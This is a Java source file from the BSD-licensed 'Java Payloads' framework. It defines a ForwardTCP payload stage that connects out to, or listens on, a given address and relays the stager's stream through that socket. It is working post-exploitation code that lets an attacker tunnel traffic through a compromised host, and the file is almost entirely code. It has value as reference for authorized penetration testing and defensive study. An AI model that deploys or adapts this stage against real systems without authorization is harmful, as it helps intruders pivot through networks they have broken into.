/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stage;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

public class ForwardTCP implements Stage {

	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
		runForwarder(in, out, parameters, true);
	}

	public static void runForwarder(InputStream in, OutputStream out, String[] parameters, boolean stage) throws Exception {
		String address = null;
		for (int i = 0; i < parameters.length; i++) {
			if (parameters[i].equals("--")) {
				// separator found. The next parameter will be the module name,
				// and all remaining parameters are for us. parameters[i+2] is
				// the address for the stager, parameters[i+3] for the stage.
				address = parameters[i + (stage ? 3 : 2)];
				break;
			}
		}
		if (address == null)
			throw new RuntimeException("No address given");
		Socket socket;
		int pos = address.indexOf(':');
		if (pos != -1) {
			String host = address.substring(0, pos);
			int port = Integer.parseInt(address.substring(pos + 1));
			socket = new Socket(host, port);
		} else {
			ServerSocket ss = new ServerSocket(Integer.parseInt(address));
			socket = ss.accept();
			ss.close();
		}

		// now let's go
		if (stage)
			out.write(0);

		try {
			new StreamForwarder(socket.getInputStream(), out, null).start();
			StreamForwarder.forward(in, socket.getOutputStream());
		} catch (SocketException ex) {
			// ignore
		} catch (Exception e) {
			if (!stage)
				throw e;
			// we may not output it in the stage as it will mess with the socket
			// stream
			e.printStackTrace();
		} finally {
			try {
				out.close();
			} catch (Throwable t) {
			}
			socket.close();
		}
	}
}